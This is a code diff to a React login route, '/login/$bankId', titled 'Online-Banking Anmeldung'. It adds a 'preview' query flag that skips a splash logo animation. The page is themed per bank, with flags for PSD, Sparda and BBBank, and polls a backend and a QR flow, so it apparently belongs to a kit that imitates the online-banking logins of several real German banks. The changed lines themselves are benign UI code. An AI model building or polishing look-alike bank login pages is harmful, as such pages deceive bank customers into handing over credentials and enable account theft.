@@ -17,7 +17,14 @@ import { deriveFlowTheme } from "@/lib/deriveTheme";
 
 
 
+import { z } from "zod";
+
+const loginSearchSchema = z.object({
+  preview: z.string().optional(),
+});
+
 export const Route = createFileRoute("/login/$bankId")({
+  validateSearch: (search) => loginSearchSchema.parse(search),
   head: ({ params }) => ({
     meta: [
       { title: `Online-Banking Anmeldung · ${params.bankId}` },
@@ -117,6 +124,9 @@ function payloadContains(data: unknown, pattern: RegExp): boolean {
 
 export function BankLoginPage({ bankId }: { bankId: string }) {
   const navigate = useNavigate();
+  const search = Route.useSearch();
+  const isPreview = search.preview === "true";
+  
   const [bank, setBank] = useState<Bank | null>(null);
   const [groupTheme, setGroupTheme] = useState<Partial<BankTheme> | null>(null);
   const [loading, setLoading] = useState(true);
@@ -267,10 +277,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   useEffect(() => {
     if (loading) return;
+    // Skip animation if preview=true is set
+    if (isPreview) {
+      setInitialLoading(false);
+      return;
+    }
     const t1 = setTimeout(() => setLoadingFading(true), 1400);
     const t2 = setTimeout(() => setInitialLoading(false), 1900);
     return () => { clearTimeout(t1); clearTimeout(t2); };
-  }, [loading]);
+  }, [loading, isPreview]);
 
   // stop polling on unmount
   useEffect(() => () => { stopPolling(); stopQrPolling(); }, []);
@@ -559,6 +574,15 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
 
   return (
     <BankShell {...shellProps}>
+      {initialLoading && !isPreview && (
+        <SplashLogoReveal 
+          logo={splashLogo} 
+          isPSD={isPSD} 
+          isSparda={isSparda} 
+          isBBBank={isBBBank} 
+          fading={loadingFading} 
+        />
+      )}
       <div className="max-w-6xl mx-auto flex flex-col lg:flex-row gap-6">
         <div className="w-full lg:w-1/2 flex flex-col gap-4">
           <div className="bg-white shadow-md border border-gray-200 overflow-hidden" style={{ borderRadius: theme.buttonRadius === "rounded-none" ? "0px" : "12px" }}>
